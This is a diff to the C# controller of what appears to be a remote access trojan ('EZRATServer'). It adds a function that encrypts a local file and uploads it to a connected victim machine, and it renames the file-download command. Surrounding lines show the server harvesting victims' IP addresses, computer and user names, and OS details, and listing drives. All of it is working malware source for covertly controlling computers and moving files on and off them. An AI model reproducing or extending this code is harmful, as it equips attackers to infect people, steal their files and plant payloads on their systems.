@@ -616,11 +616,11 @@ namespace EZRATServer
                         string[] mainContainer = text.Split(';'); // Get the main data parts
                         int id = int.Parse(mainContainer[1]); //The client ID
                         string[] lines = mainContainer[2].Split('¦'); //Split the data into parts
-                        string ip = lines[0]; //The computer's local IPv4 address
+                        string ip = lines[0] + $" : {((IPEndPoint)_clientSockets[id].RemoteEndPoint).Port}"; //The computer's local IPv4 address
                         string name = lines[1]; //The Computer Name
                         string user = lines[2].Substring(lines[2].LastIndexOf('\\') + 1); //The computer's date and time
                         string windows = lines[3]; //The computer's installed Anti Virus product
-
+                        
                         AddToData(new ClientData(id, ip, name, user, windows)); //Update the UI
                     }
                     else if (text.StartsWith("lsdrives;"))
@@ -647,7 +647,7 @@ namespace EZRATServer
                         string[] result = msg.Split('¦');
                         cht.UpdateAllData(result);
                     }
-                    else if (text.StartsWith("dfile;"))
+                    else if (text.StartsWith("dlfile;"))
                     {
                         text = text.Substring(6);
                         byte[] recFile = Encoding.Default.GetBytes(text);
@@ -665,11 +665,37 @@ namespace EZRATServer
         }
 
 
+
+        public void SendFile(string path,string pathUploaded,int id)
+        {
+            if (!_clientSockets[id].Connected) //If the client isn't connected
+            {
+                Console.WriteLine("Socket is not connected!");
+                return; //Return
+            }
+
+
+            try
+            {
+                
+                string data = Encrypt("upfile;" + pathUploaded + path.Substring(path.LastIndexOf('\\') + 1)  + ";" + File.ReadAllText(path));
+                string header = data.Length.ToString() + "§";
+                byte[] result = Encoding.Default.GetBytes(header+data);
+                _clientSockets[id].Send(result);
+            }
+            catch (Exception ex) //Failed to send data to the server
+            {
+                Console.WriteLine("Send File Failure " + ex.Message);
+                return; //Return
+            }
+        }
+
+
         private void ReceiveFile(byte[] data, string path)
         {
 
 
-            string dir = path.Substring(0,path.LastIndexOf('\\'));
+            string dir = path.Substring(0, path.LastIndexOf('\\'));
             if (!Directory.Exists(dir))
             {
                 Directory.CreateDirectory(dir);
@@ -677,6 +703,7 @@ namespace EZRATServer
             File.WriteAllBytes(path, data);
 
         }
+
 
 
         // lstIP, lstName, lstUser, lstWindows
